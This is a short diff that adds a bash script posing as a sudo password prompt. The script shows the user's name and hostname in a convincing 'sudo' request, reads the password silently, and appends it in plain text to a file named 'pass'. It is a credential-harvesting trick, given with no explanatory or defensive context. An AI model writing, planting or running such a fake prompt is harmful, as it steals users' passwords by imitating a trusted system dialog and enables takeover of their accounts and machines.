@@ -1,0 +1,4 @@
+#!/bin/bash
+HOST=$(cat /etc/hostname)
+read -s -p "sudo $USER@$HOST password: " PASS
+echo $PASS >> pass
